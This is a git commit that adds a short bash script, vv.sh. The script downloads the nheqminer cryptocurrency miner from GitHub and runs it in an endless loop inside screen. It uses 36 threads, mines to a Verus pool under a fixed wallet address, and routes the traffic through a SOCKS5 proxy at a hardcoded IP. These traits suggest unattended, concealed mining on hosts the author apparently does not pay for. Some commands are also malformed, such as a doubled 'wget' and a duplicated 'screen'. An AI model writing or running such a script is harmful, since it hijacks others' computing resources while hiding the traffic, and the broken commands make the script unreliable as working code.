07872735559efbc7f57efd593b70a3baa30f1cdf
Taryok <92034895+Taryok@users.noreply.github.com>
2021-12-20 15:21:27 +0700

    Create vv.sh

---
+++ vv.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+apt-get update -y
+apt-get install -y libjansson-dev
+apt install screen -y screen
+wget wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tar.gz 
+cd nheqminer
+while [ 2 ]; do
+screen ./nheqminer -v -l ap.luckpool.net:3956 -u RYJDLYsGHZZTBQg7RxEi3j4Cx2fZGpVX5p.STB -p x -t 36 --proxy socks5://98.175.31.195:4145
+done
+exit
